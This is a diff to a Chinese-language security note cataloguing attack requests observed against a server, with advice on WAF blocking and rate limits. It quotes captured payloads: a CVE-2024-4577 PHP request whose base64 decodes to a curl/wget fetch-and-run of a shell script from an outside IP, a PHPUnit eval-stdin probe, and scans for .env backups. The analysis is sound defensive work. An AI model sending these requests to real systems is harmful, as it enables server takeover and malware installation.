@@ -55,11 +55,38 @@ Content-Length: 221
 <?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA=")); echo(md5("Hello CVE-2024-4577")); ?>
 ```
 
+```
+GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Host: 182.140.209.44:443
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 33
+
+<?php echo(md5("Hello PHPUnit"));
+```
+
 ## 扫描
 #### 针对常见接口的扫描 ：
 攻击者常对一些常见的 Web 接口进行扫描，如 wordpress 的 wp-admin、openapi 的 /openapi/、通用的 /admin/ /test/ /.env 等，以寻找可利用的漏洞或敏感信息。虽当前产品未使用，但此类扫描行为仍需关注，防止未来业务扩展后产生风险。
 ```
+GET /openapi/v2 HTTP/1.1
+user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1
+accept: application/json
+accept-encoding: gzip, br, deflate
+host: 182.140.209.44
 
+```
+
+```
+GET /.env.bak HTTP/1.1
+user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1
+accept: */*
+accept-encoding: gzip, br, deflate
+host: 182.140.209.44
+```
 
 #### 搜索引擎的蜘蛛或其他爬虫 ：
 搜索引擎会主动请求 /robot.txt 以了解网站可爬取的范围，但部分扫描脚本也会利用该文件来获取网站信息，存在一定风险。鉴于当前产品无需搜索引擎爬取，可在 WAF 上配置拦截策略，禁止搜索引擎爬虫和恶意扫描脚本的访问，同时设置合理的访问频率限制，防止爬虫对服务器造成过大压力。
